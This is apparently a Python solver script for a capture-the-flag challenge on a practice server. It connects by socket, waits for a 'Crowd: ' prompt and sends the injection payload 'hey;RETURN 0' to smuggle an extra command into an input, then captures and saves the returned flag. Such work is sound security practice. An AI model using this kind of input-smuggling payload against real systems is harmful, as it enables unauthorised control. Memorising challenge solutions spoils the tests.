import socket
import re
import sys

def parse_connection_cfg(path="connection.cfg"):
    config = {}
    with open(path, "r") as f:
        for line in f:
            line = line.strip()
            if "=" in line:
                k, v = line.split("=", 1)
                config[k.strip()] = v.strip()
    return config

def solve():
    config = parse_connection_cfg()
    host = config.get("HOST", "chatelaine.cylabacademy.net")
    port = int(config.get("PORT", 43489))
    
    print(f"Connecting to {host}:{port}...", flush=True)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    buffer = ""
    flag = None
    
    while True:
        data = s.recv(4096)
        if not data:
            break
        text = data.decode("utf-8", errors="replace")
        buffer += text
        print(text, end="", flush=True)
        
        if "Crowd: " in buffer:
            print("\nSending payload: hey;RETURN 0", flush=True)
            s.sendall(b"hey;RETURN 0\n")
            buffer = ""  # reset buffer to catch subsequent output
            
        m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", text)
        if not m:
            m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", buffer)
            
        if m:
            flag = m.group(1)
            print(f"\n[+] Flag found: {flag}", flush=True)
            break
            
    s.close()
    
    if flag:
        with open("flag.txt", "w") as f:
            f.write(flag + "\n")
        print(f"Saved flag to flag.txt", flush=True)
        return flag
    else:
        print("Flag not found!", flush=True)
        return None

if __name__ == "__main__":
    solve()
